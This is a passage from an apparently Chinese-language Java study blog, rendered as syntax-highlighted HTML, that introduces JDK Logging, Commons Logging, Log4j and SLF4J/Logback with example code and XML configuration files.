&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;array cannot be null&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="日志">日志&lt;/h2>
&lt;p>为了取代&lt;code>System.out.println()&lt;/code>，封装好了很多好用的方法&lt;/p>
&lt;h3 id="jdk-logging">JDK Logging&lt;/h3>
&lt;p>标准库自带&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Level&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Logger&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Logger&lt;/span> &lt;span style="color:#111">logger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getGlobal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start process...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;memory is running out...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">fine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ignored.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">severe&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process will be terminated...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JDK的Logging定义了7个日志级别，从严重到普通&lt;/li>
&lt;/ul>
&lt;p>SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST&lt;/p>
&lt;ul>
&lt;li>局限：配置不太方便，需要在JVM启动时传递参数&lt;code>-Djava.util.logging.config.file=&amp;lt;config-file-name&amp;gt;&lt;/code>，一旦开始运行&lt;code>main()&lt;/code>方法，就无法修改配置&lt;/li>
&lt;/ul>
&lt;h3 id="commons-logging">Commons Logging&lt;/h3>
&lt;p>第三方，由Apache创建，可以挂接不同的日志系统，并通过配置文件指定挂接的日志系统&lt;/p>
&lt;p>可作为日志接口，而非日志实现&lt;/p>
&lt;ul>
&lt;li>默认搜索Log4j，没有的话用JDK Logging&lt;/li>
&lt;li>使用很简单&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.Log&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.LogFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 打印日志
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>6个日志级别&lt;/li>
&lt;/ul>
&lt;p>FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE&lt;/p>
&lt;ul>
&lt;li>除&lt;code>info(String)&lt;/code>外还有&lt;code>info(String, Throwable)&lt;/code>这样一个重载方法，便于更简单地记录异常&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;got exception!&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果在静态方法中引用&lt;code>Log&lt;/code>，通常直接定义一个静态类型变量：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 在静态方法中引用Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>在实例方法中引用&lt;code>Log&lt;/code>，通常定义一个实例变量&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 在实例方法中引用Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>上面展示了两种&lt;code>getLog()&lt;/code>的方式，第二种的好处是子类可以直接使用该实例，原因是Java的动态特性，子类获取的&lt;code>Log&lt;/code>字段实际上相当于&lt;code>LogFactory.getLog(Student.class)&lt;/code>，但却是从父类继承而来，并且无需改动代码&lt;/li>
&lt;/ul>
&lt;h3 id="log4j">Log4j&lt;/h3>
&lt;p>日志实现（乐）Log4j，我真的好喜欢你啊！为了你，我不要用无序列表了！！！&lt;/p>
&lt;p>Log4j是一个组件化设计的日志系统，它的架构大致如下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227012115179.png" alt="image-20220227012115179">&lt;/p>
&lt;p>当我们使用Log4j输出一条日志时，Log4j自动通过不同的Appender把同一条日志输出到不同的目的地&lt;/p>
&lt;ul>
&lt;li>console：输出到屏幕；&lt;/li>
&lt;li>file：输出到文件；&lt;/li>
&lt;li>socket：通过网络输出到远程计算机；&lt;/li>
&lt;li>jdbc：输出到数据库&lt;/li>
&lt;/ul>
&lt;p>通过Filter来过滤哪些log需要被输出，最后，通过Layout来格式化日志信息&lt;/p>
&lt;p>使用Log4j时只需把一个&lt;code>log4j2.xml&lt;/code>的文件放到&lt;code>classpath&lt;/code>下就可以让Log4j读取配置文件并按照我们的配置来输出日志&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义日志格式 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;log.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义文件名变量 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.filename&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.log&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.%i.log.gz&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义Appender，即目的地 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义输出到屏幕 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Console&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">target=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SYSTEM_OUT&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 日志格式引用上面定义的log.pattern --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Console&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义输出到文件,文件名引用上面定义的file.err.filename --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;RollingFile&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">bufferedIO=&lt;/span>&lt;span style="color:#d88200">&amp;#34;true&amp;#34;&lt;/span> &lt;span style="color:#75af00">fileName=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.filename}&amp;#34;&lt;/span> &lt;span style="color:#75af00">filePattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.pattern}&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 根据文件大小自动切割日志 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;SizeBasedTriggeringPolicy&lt;/span> &lt;span style="color:#75af00">size=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1 MB&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 保留最近10份 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;DefaultRolloverStrategy&lt;/span> &lt;span style="color:#75af00">max=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/RollingFile&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 对info级别的日志，输出到console --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 对error级别的日志，输出到err，即上面定义的RollingFile --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="slf4jlogback">SLF4J&amp;amp;Logback&lt;/h3>
&lt;p>类似上面那一对，做了些许改进&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Commons Logging&lt;/th>
&lt;th style="text-align:left">SLF4J&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.Log&lt;/td>
&lt;td style="text-align:left">org.slf4j.Logger&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.LogFactory&lt;/td>
&lt;td style="text-align:left">org.slf4j.LoggerFactory&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>仍使用xml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.ConsoleAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.RollingFileAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;charset&amp;gt;&lt;/span>utf-8&lt;span style="color:#f92672">&amp;lt;/charset&amp;gt;&lt;/span>
